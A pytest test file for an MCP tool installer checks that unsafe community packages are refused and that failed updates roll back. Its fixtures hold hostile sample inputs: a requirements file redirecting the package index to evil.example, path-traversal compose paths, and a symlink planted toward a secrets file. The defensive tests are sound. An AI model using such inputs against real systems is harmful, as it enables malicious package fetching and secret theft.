"""The community install gate: a Docker-Compose refusal is judged before any
file moves, the incoming-tree checks run off the event loop, a catalog Python
folder ships no requirements file, the git source identity keeps host and
scheme, ``server.docker_compose`` names a file inside the MCP folder, a hung
package install times out and rolls back, and a remnant folder keeps only its
preserved data."""

from __future__ import annotations

import asyncio
import json
import os
import threading
from pathlib import Path

import pytest
import yaml
from fastapi import HTTPException

import config
from core.config import deployment
from services.community import community_installer as ci
from services.mcp import mcp_manifest_parse as mmp, mcp_manifest_store, mcp_registry
from tests._compute import builds


@pytest.fixture
def mcps_dir(tmp_path, monkeypatch):
    root = tmp_path / "opt" / "otodock" / "mcps"
    (root / "community").mkdir(parents=True)
    monkeypatch.setattr(config, "MCPS_DIR", root)
    monkeypatch.setattr(mcp_manifest_store, "_manifests", {})
    return root


@pytest.fixture
def t2(monkeypatch):
    """Docker-Compose mode with the container side stubbed: the gate's own
    rules are under test, not the daemon."""
    from services.mcp import docker_manager
    monkeypatch.setattr(deployment, "in_docker_compose", lambda: True)
    monkeypatch.setattr(deployment, "current_mode", lambda: deployment.MANAGED_SOCKPROX)
    monkeypatch.setattr(config, "OTODOCK_NETWORK", "otodock")
    monkeypatch.setattr(docker_manager, "_inject_mcp_env", lambda m: False)
    started: list[str] = []
    monkeypatch.setattr(docker_manager, "start_container",
                        lambda m, **kw: started.append(m.name) or True)
    return started


def _docker_manifest(name: str = "dock-mcp", **server) -> dict:
    return {
        "name": name, "label": "Dock", "description": "d", "version": "1.0.0",
        "category": "community",
        "server": {"runtime": "docker", "transport": "streamable_http",
                   "docker_compose": "docker-compose.yml", "port": 8080,
                   "image": "ghcr.io/otodock/dock:1", "source": "docker:dock",
                   **server},
    }


def _folder(tmp_path: Path, manifest: dict, tag: str, *, compose: dict | None = None,
            files: dict[str, str] | None = None) -> Path:
    src = tmp_path / "upload" / f"{manifest['name']}-{tag}"
    src.mkdir(parents=True)
    (src / "manifest.json").write_text(json.dumps(manifest))
    (src / "README.md").write_text(f"Dock {tag}.\n")
    if compose is not None:
        (src / "docker-compose.yml").write_text(yaml.safe_dump(compose))
    for rel, body in (files or {}).items():
        p = src / rel
        p.parent.mkdir(parents=True, exist_ok=True)
        p.write_text(body)
    return src


CLEAN = {"services": {"dock": {"build": ".", "env_file": ".env"}}}
REFUSED = {"services": {"dock": {"build": ".", "env_file": "/opt/otodock/config.env"}}}


# ── a compose refusal is judged before any file moves ──────────────────

@pytest.mark.asyncio
async def test_a_refused_compose_update_keeps_the_installed_version(mcps_dir, tmp_path, t2):
    await ci.install_from_extracted_folder(_folder(tmp_path, _docker_manifest(), "a", compose=CLEAN))
    target = mcps_dir / "community" / "dock-mcp"
    before = sorted(p.relative_to(target) for p in target.rglob("*"))
    with pytest.raises(HTTPException) as ei:
        await ci.install_from_extracted_folder(
            _folder(tmp_path, _docker_manifest(version="2.0.0"), "b", compose=REFUSED))
    assert ei.value.status_code == 400
    assert "Docker-Compose mode" in ei.value.detail
    assert (target / "README.md").read_text() == "Dock a.\n"
    assert sorted(p.relative_to(target) for p in target.rglob("*")) == before
    assert not target.with_suffix(".bak").exists()
    assert mcp_registry.get_manifest("dock-mcp").version == "1.0.0"


@pytest.mark.asyncio
async def test_a_refused_compose_install_leaves_no_folder(mcps_dir, tmp_path, t2):
    with pytest.raises(HTTPException) as ei:
        await ci.install_from_extracted_folder(
            _folder(tmp_path, _docker_manifest(), "a", compose=REFUSED))
    assert ei.value.status_code == 400
    assert not (mcps_dir / "community" / "dock-mcp").exists()
    assert mcp_registry.get_manifest("dock-mcp") is None
    assert t2 == []


@pytest.mark.asyncio
async def test_a_docker_mcp_without_an_image_is_refused_before_any_file_moves(
        mcps_dir, tmp_path, t2):
    manifest = _docker_manifest()
    manifest["server"].pop("image")
    with pytest.raises(HTTPException) as ei:
        await ci.install_from_extracted_folder(_folder(tmp_path, manifest, "a", compose=CLEAN))
    assert ei.value.status_code == 400
    assert "pre-built image" in ei.value.detail
    assert not (mcps_dir / "community" / "dock-mcp").exists()


@pytest.mark.asyncio
async def test_a_clean_compose_installs_and_is_rewritten(mcps_dir, tmp_path, t2):
    result = await ci.install_from_extracted_folder(
        _folder(tmp_path, _docker_manifest(), "a", compose=CLEAN))
    assert result["status"] == "installed"
    written = yaml.safe_load((mcps_dir / "community" / "dock-mcp" / "docker-compose.yml").read_text())
    assert written["services"]["dock"]["image"] == "ghcr.io/otodock/dock:1"
    assert t2 == ["dock-mcp"]


# ── the incoming-tree checks run off the event loop ────────────────────

@pytest.mark.asyncio
async def test_the_incoming_tree_walk_runs_off_the_loop(mcps_dir, tmp_path, monkeypatch):
    seen: list[bool] = []
    real = ci._refuse_shipped_trees

    def _spy(root):
        seen.append(threading.current_thread() is threading.main_thread())
        return real(root)

    monkeypatch.setattr(ci, "_refuse_shipped_trees", _spy)
    manifest = {"name": "ctx-mcp", "label": "c", "description": "d", "version": "1",
                "category": "community", "server": {"runtime": "none", "transport": "none"}}
    await ci.install_from_extracted_folder(_folder(tmp_path, manifest, "a"))
    assert seen == [False]


# ── a catalog Python folder carries no requirements file ───────────────

@pytest.fixture
def fake_package_install(monkeypatch):
    calls: list[tuple[str, str]] = []

    async def _install(mcp_dir, runtime, source, **kw):
        calls.append((runtime, source))
        return ci.mcp_installer.InstallResult(
            ok=True, log="", version_hash="h", resolved_version="1.0.0",
        )

    builds(monkeypatch, install=_install)
    return calls


@pytest.mark.asyncio
async def test_a_python_catalog_folder_loses_its_requirements_file(
        mcps_dir, tmp_path, fake_package_install):
    manifest = {"name": "py-mcp", "label": "p", "description": "d", "version": "",
                "category": "community",
                "server": {"runtime": "python", "transport": "stdio",
                           "command": "venv/bin/py-mcp", "source": "pypi:py-mcp"}}
    src = _folder(tmp_path, manifest, "a",
                  files={"requirements.txt": "--index-url https://evil.example\nx\n"})
    await ci.install_from_extracted_folder(src)
    assert not (mcps_dir / "community" / "py-mcp" / "requirements.txt").exists()


@pytest.mark.asyncio
async def test_a_docker_catalog_folder_keeps_its_build_requirements(mcps_dir, tmp_path, monkeypatch):
    monkeypatch.setattr(deployment, "in_docker_compose", lambda: False)
    monkeypatch.setattr(deployment, "current_mode", lambda: deployment.MANAGED_LOCAL)
    src = _folder(tmp_path, _docker_manifest(), "a", compose=CLEAN,
                  files={"requirements.txt": "ffmpeg-python==0.2.0\n"})
    await ci.install_from_extracted_folder(src)
    assert (mcps_dir / "community" / "dock-mcp" / "requirements.txt").is_file()


# ── the git source identity ────────────────────────────────────────────

def _git(source: str) -> tuple[str, str]:
    return ci.source_identity(runtime="python", source=source, image="", url_template="")


def test_git_identity_with_userinfo_and_no_ref_keeps_the_host():
    assert _git("git+ssh://git@github.com/org/repo.git") != _git("git+ssh://git@evil.example/x/y.git")
    assert _git("git+https://user@host/org/repo.git") == ("git", "git+https://host/org/repo#")
    assert _git("git+ssh://git@github.com/org/repo.git@v1.2#subdirectory=mcp") == \
        ("git", "git+ssh://github.com/org/repo#mcp")


def test_git_identity_keeps_the_scheme():
    assert _git("git+https://host/r.git") != _git("git+http://host/r.git")
    assert _git("git+https://host/r.git@v1") == _git("git+HTTPS://HOST/r@v2")


def test_git_identity_refuses_an_ambiguous_subdirectory():
    kind, _ = _git("git+https://host/r.git#subdirectory=a&subdirectory=b")
    assert kind == "unknown"
    errors = ci._validate_manifest({
        "name": "g", "label": "g", "description": "d", "version": "1",
        "category": "community",
        "server": {"runtime": "python", "command": "x",
                   "source": "git+https://host/r.git#subdirectory=a&subdirectory=b"},
    })
    assert any("subdirectory" in e for e in errors)


# ── server.docker_compose names a file inside the folder ───────────────

@pytest.mark.asyncio
@pytest.mark.parametrize("rel", ["../other/docker-compose.yml", "/etc/compose.yml",
                                 "sub/../../x.yml"])
async def test_an_unconfined_compose_path_is_refused_at_the_gate(mcps_dir, tmp_path, rel):
    with pytest.raises(HTTPException) as ei:
        await ci.install_from_extracted_folder(
            _folder(tmp_path, _docker_manifest(docker_compose=rel), "a", compose=CLEAN))
    assert ei.value.status_code == 400
    assert "docker_compose" in ei.value.detail
    assert not (mcps_dir / "community" / "dock-mcp").exists()


@pytest.mark.parametrize("rel", ["../other/docker-compose.yml", "/etc/compose.yml"])
def test_an_unconfined_compose_path_is_dropped_at_parse(tmp_path, rel):
    d = tmp_path / "dock-mcp"
    d.mkdir()
    (d / "manifest.json").write_text(json.dumps(_docker_manifest(docker_compose=rel)))
    m = mmp._parse_manifest(d / "manifest.json")
    assert m is not None and m.server.docker_compose == ""


def test_a_confined_compose_path_parses(tmp_path):
    d = tmp_path / "dock-mcp"
    d.mkdir()
    (d / "manifest.json").write_text(json.dumps(_docker_manifest(docker_compose="deploy/compose.yml")))
    assert mmp._parse_manifest(d / "manifest.json").server.docker_compose == "deploy/compose.yml"


# ── a hung package install times out and rolls back ────────────────────

def _npm_manifest(version: str = "1.0.0") -> dict:
    return {"name": "node-mcp", "label": "n", "description": "d", "version": version,
            "category": "community",
            "server": {"runtime": "node", "transport": "stdio", "command": "node",
                       "args": ["node_modules/pkg/index.js"], "source": "npm:pkg"}}


def _machine_installs(monkeypatch, *, timeout: int = ci.mcp_installer.DEFAULT_INSTALL_TIMEOUT) -> None:
    """The compute machine's build: the installer itself in the tool's
    folder, its steps this process's children (a build's sandbox:
    tests/mcp/test_tool_build.py). A step past ``timeout`` fails the build
    with the cause a machine reports for an installer's error."""
    installer = ci.mcp_installer

    async def _install(mcp_dir, runtime, source, **kw):
        try:
            return await installer.install_mcp(mcp_dir, runtime, source, timeout=timeout,
                                               run=installer.run_unconfined, **kw)
        except asyncio.TimeoutError as exc:
            return installer.InstallResult(ok=False, log=f"{type(exc).__name__}: {exc}")

    builds(monkeypatch, install=_install)


def _alive(pid: int) -> bool:
    try:
        stat = Path(f"/proc/{pid}/stat").read_text()
    except OSError:
        return False
    return stat.rsplit(")", 1)[1].split()[0] not in ("Z", "X")


@pytest.mark.asyncio
@pytest.mark.skipif(not Path("/proc/self/stat").exists(), reason="reads /proc")
async def test_a_hung_package_install_times_out_and_rolls_back(mcps_dir, tmp_path, monkeypatch):
    """The installer's timeout bounds the package manager's whole run: a hung
    npm is killed with its children, the update fails with the cause the
    machine reports and the previous version is back in place."""
    bin_dir = tmp_path / "bin"
    bin_dir.mkdir()
    pids = tmp_path / "npm.pids"
    hang = tmp_path / "npm.hang"
    npm = bin_dir / "npm"
    npm.write_text(
        "#!/bin/sh\n"
        f'echo $$ >> "{pids}"\n'
        f'if [ -f "{hang}" ]; then sleep 20 & echo $! >> "{pids}"; sleep 20; exit 0; fi\n'
        "mkdir -p node_modules/pkg && printf '{\"version\":\"1.0.0\"}' > node_modules/pkg/package.json\n")
    npm.chmod(0o755)
    monkeypatch.setenv("PATH", f"{bin_dir}:{os.environ.get('PATH', '/usr/bin')}")
    # The fake npm's pids are read here, outside a build's sandbox: the step
    # runs as this process's child (the sandboxed kill: tests/mcp/test_tool_build.py).
    _machine_installs(monkeypatch, timeout=1)

    await ci.install_from_extracted_folder(_folder(tmp_path, _npm_manifest(), "a"))
    target = mcps_dir / "community" / "node-mcp"
    hang.write_text("")
    with pytest.raises(HTTPException) as ei:
        await asyncio.wait_for(
            ci.install_from_extracted_folder(_folder(tmp_path, _npm_manifest("2.0.0"), "b")), 10)
    assert ei.value.status_code == 500
    assert "npm install did not finish within 1 s" in ei.value.detail
    assert (target / "README.md").read_text() == "Dock a.\n"
    assert not target.with_suffix(".bak").exists()
    for _ in range(40):
        if not any(_alive(int(p)) for p in pids.read_text().split()):
            break
        await asyncio.sleep(0.05)
    assert not [p for p in pids.read_text().split() if _alive(int(p))]


# ── a remnant folder loses what the incoming folder does not carry ─────

@pytest.mark.asyncio
async def test_a_stray_patch_in_a_remnant_folder_is_gone_before_the_package_installs(
        mcps_dir, tmp_path, monkeypatch):
    seen: list[bool] = []

    async def _install(mcp_dir, runtime, source, **kw):
        seen.append((Path(mcp_dir) / "patches").exists())
        return ci.mcp_installer.InstallResult(ok=True, log="", version_hash="h",
                                              resolved_version="1.0.0")

    builds(monkeypatch, install=_install)
    remnant = mcps_dir / "community" / "node-mcp"
    (remnant / "patches").mkdir(parents=True)
    (remnant / "patches" / "stray.patch").write_text("x")
    (remnant / "keys").mkdir()
    (remnant / "keys" / "id").write_text("k")
    await ci.install_from_extracted_folder(_folder(tmp_path, _npm_manifest(), "a"))
    assert seen == [False]
    assert (remnant / "keys" / "id").read_text() == "k"


# ── the rollback after a build: links kept, the folder put aside ─────────────

def _fake_npm(tmp_path: Path, monkeypatch, *, fail: Path) -> None:
    """An npm that installs ``pkg`` unless ``fail`` exists, run by the compute
    machine's build (``_machine_installs``)."""
    bin_dir = tmp_path / "bin"
    bin_dir.mkdir(exist_ok=True)
    npm = bin_dir / "npm"
    npm.write_text(
        "#!/bin/sh\n"
        f'if [ -f "{fail}" ]; then echo broken; exit 1; fi\n'
        "mkdir -p node_modules/pkg && printf '{\"version\":\"1.0.0\"}' > node_modules/pkg/package.json\n")
    npm.chmod(0o755)
    monkeypatch.setenv("PATH", f"{bin_dir}:{os.environ.get('PATH', '/usr/bin')}")
    _machine_installs(monkeypatch)


@pytest.mark.asyncio
async def test_a_fresh_install_that_fails_leaves_no_folder(mcps_dir, tmp_path, monkeypatch):
    fail = tmp_path / "fail"
    fail.write_text("")
    _fake_npm(tmp_path, monkeypatch, fail=fail)
    with pytest.raises(HTTPException) as ei:
        await ci.install_from_extracted_folder(_folder(tmp_path, _npm_manifest(), "a"))
    assert ei.value.status_code == 500
    assert sorted(p.name for p in (mcps_dir / "community").iterdir()) == []


@pytest.mark.asyncio
async def test_a_link_a_build_left_is_never_read_through_by_the_backup(mcps_dir, tmp_path, monkeypatch):
    """A build may leave a link in its outputs pointing at a platform file. The
    update's backup and the rollback copy it as a link, never the bytes it
    names: the tool's folder never holds the platform's secret."""
    fail = tmp_path / "fail"
    _fake_npm(tmp_path, monkeypatch, fail=fail)
    secret = tmp_path / "config.env"
    secret.write_text("JWT_SECRET=never-in-a-tool\n")
    await ci.install_from_extracted_folder(_folder(tmp_path, _npm_manifest(), "a"))
    target = mcps_dir / "community" / "node-mcp"
    (target / "node_modules" / "evil").symlink_to(secret)
    fail.write_text("")
    with pytest.raises(HTTPException):
        await ci.install_from_extracted_folder(_folder(tmp_path, _npm_manifest("2.0.0"), "b"))
    planted = target / "node_modules" / "evil"
    assert planted.is_symlink() and os.readlink(planted) == str(secret)
    assert not [p for p in target.rglob("*") if p.is_file() and not p.is_symlink()
                and "never-in-a-tool" in p.read_text(errors="replace")]


@pytest.mark.asyncio
async def test_a_refused_build_answers_its_sentence_and_restores_the_folder(mcps_dir, tmp_path, monkeypatch):
    from core import placement
    from services.mcp import mcp_sync
    _fake_npm(tmp_path, monkeypatch, fail=tmp_path / "fail")
    await ci.install_from_extracted_folder(_folder(tmp_path, _npm_manifest(), "a"))

    async def _refused(*a, **kw):
        raise mcp_sync.NoBuildMachine(placement.NO_COMPUTE_SENTENCE)
    monkeypatch.setattr(mcp_sync, "build_on_machine", _refused)
    with pytest.raises(HTTPException) as ei:
        await ci.install_from_extracted_folder(_folder(tmp_path, _npm_manifest("2.0.0"), "b"))
    assert ei.value.status_code == 503 and ei.value.detail == placement.NO_COMPUTE_SENTENCE
    target = mcps_dir / "community" / "node-mcp"
    assert (target / "README.md").read_text() == "Dock a.\n"


def _owner_bits_back(root: Path) -> None:
    for dirpath, dirnames, filenames in os.walk(root):
        for name in dirnames + filenames:
            path = os.path.join(dirpath, name)
            if not os.path.islink(path):
                os.chmod(path, 0o700)


@pytest.mark.asyncio
@pytest.mark.parametrize("blockers", [("pipe",), ("unreadable",), ("pipe", "locked"), ("unreadable", "locked")])
async def test_an_update_whose_backup_cannot_be_taken_leaves_the_tool_as_it_was(
        mcps_dir, tmp_path, monkeypatch, blockers):
    """The backup copy fails before anything is replaced (a pipe a build left,
    a file the platform cannot read, a full disk): the tool stays, with its
    keys, data and override file, and the admin reads why. A half backup
    that will not go (a folder a build left with no write bit) is never put
    back in place of the tool."""
    _fake_npm(tmp_path, monkeypatch, fail=tmp_path / "fail")
    await ci.install_from_extracted_folder(_folder(tmp_path, _npm_manifest(), "a"))
    target = mcps_dir / "community" / "node-mcp"
    (target / "keys").mkdir()
    (target / "keys" / "api.key").write_text("secret\n")
    (target / "config").mkdir()
    (target / "config" / "state.json").write_text("{}\n")
    (target / "docker-compose.override.yml").write_text("services: {}\n")
    if "pipe" in blockers:
        os.mkfifo(target / "node_modules" / "left-by-a-build")
    if "unreadable" in blockers:
        (target / "config" / "written-by-its-container").write_text("x")
        os.chmod(target / "config" / "written-by-its-container", 0)
    if "locked" in blockers:
        locked = target / "node_modules" / "a-locked"
        locked.mkdir()
        (locked / "file").write_text("x")
        os.chmod(locked, 0o555)
    try:
        with pytest.raises(HTTPException) as ei:
            await ci.install_from_extracted_folder(_folder(tmp_path, _npm_manifest("2.0.0"), "b"))
        assert (target / "keys" / "api.key").read_text() == "secret\n"
        assert (target / "config" / "state.json").read_text() == "{}\n"
        assert (target / "docker-compose.override.yml").read_text() == "services: {}\n"
        assert (target / "README.md").read_text() == "Dock a.\n"
        assert not (mcps_dir / "community" / "node-mcp.bak").exists()
        assert ei.value.status_code == 500
        assert ei.value.detail.startswith("The install failed and nothing was changed.\n\n"
                                          "OtoDock could not copy the installed tool first: ")
        assert ("left-by-a-build" if "pipe" in blockers else "written-by-its-container") in ei.value.detail
        assert ei.value.detail.endswith("Free disk space if the disk is full. "
                                        "Otherwise uninstall the tool and install it again.")
    finally:
        _owner_bits_back(mcps_dir)


def test_the_rollback_puts_the_failed_folder_aside_before_the_backup_goes_back(tmp_path):
    """A writer the kill missed holds the failed folder: its writes land in
    the copy put aside, never in the restored folder."""
    target = tmp_path / "tool"
    backup = tmp_path / "tool.bak"
    (target / "venv").mkdir(parents=True)
    (backup / "venv").mkdir(parents=True)
    (backup / "venv" / "kept").write_text("old\n")
    survivor = open(target / "venv" / "kept", "w")  # held across the rollback on purpose
    try:
        ci._rollback_extracted_files(target, backup)
        survivor.write("written by a survivor\n")
        survivor.flush()
    finally:
        survivor.close()
    assert (target / "venv" / "kept").read_text() == "old\n"
    assert not backup.exists() and not (tmp_path / "tool.failed").exists()


def test_a_failed_folder_with_no_permission_bits_is_still_removed(tmp_path):
    """A build may leave a folder no one can enter: the rollback gives it its
    owner's bits back, so no ``<tool>.failed`` stays to be read as the tool."""
    target = tmp_path / "tool"
    locked = target / "venv" / "locked"
    locked.mkdir(parents=True)
    (locked / "file").write_text("x")
    os.chmod(locked, 0)
    ci._rollback_extracted_files(target, None)
    assert sorted(p.name for p in tmp_path.iterdir()) == []


def test_an_old_failed_folder_that_will_not_go_never_stops_a_rollback(tmp_path, monkeypatch):
    target = tmp_path / "tool"
    backup = tmp_path / "tool.bak"
    (target / "venv").mkdir(parents=True)
    (backup / "venv").mkdir(parents=True)
    (backup / "venv" / "kept").write_text("old\n")
    (tmp_path / "tool.failed").mkdir()
    from services.mcp import mcp_installer
    real = mcp_installer.remove_tree
    calls: list[str] = []

    def _stuck(path):
        calls.append(path.name)
        if len(calls) == 1:  # the old aside, before the rollback moves anything
            raise OSError("stuck")
        return real(path)
    monkeypatch.setattr(mcp_installer, "remove_tree", _stuck)
    ci._rollback_extracted_files(target, backup)
    assert (target / "venv" / "kept").read_text() == "old\n"
    left = [p.name for p in tmp_path.iterdir() if p.name.endswith(".failed")]
    assert len(left) == 1 and left[0].startswith("tool.") and left[0] != "tool.failed"


def test_a_failed_folder_is_never_read_as_the_tool_and_goes_at_boot(mcps_dir):
    from services.mcp import mcp_manifest_store
    aside = mcps_dir / "community" / "demo.failed"
    aside.mkdir(parents=True)
    (aside / "manifest.json").write_text(json.dumps({"name": "demo", "server": {"runtime": "none"}}))
    mcp_manifest_store.scan_manifests()
    assert "demo" not in mcp_manifest_store._manifests
    assert ci.sweep_failed_asides() == ["demo.failed"] and not aside.exists()


@pytest.mark.asyncio
async def test_a_finished_updates_backup_that_will_not_go_is_never_put_back(mcps_dir, tmp_path, monkeypatch):
    """A backup left at a start is put back as an update the platform died
    in: one a finished update could not remove goes under the swept failed
    name, so the next start never reverts the update."""
    from services.mcp import mcp_installer
    _fake_npm(tmp_path, monkeypatch, fail=tmp_path / "fail")
    await ci.install_from_extracted_folder(_folder(tmp_path, _npm_manifest(), "a"))
    real = mcp_installer.remove_tree

    def _stuck(path):
        if path.name.endswith(".bak") and path.exists():
            raise OSError("stuck")
        return real(path)
    monkeypatch.setattr(mcp_installer, "remove_tree", _stuck)
    await ci.install_from_extracted_folder(_folder(tmp_path, _npm_manifest("2.0.0"), "b"))
    names = sorted(p.name for p in (mcps_dir / "community").iterdir())
    assert "node-mcp.bak" not in names
    assert [n for n in names if n.endswith(".failed")] and "node-mcp" in names
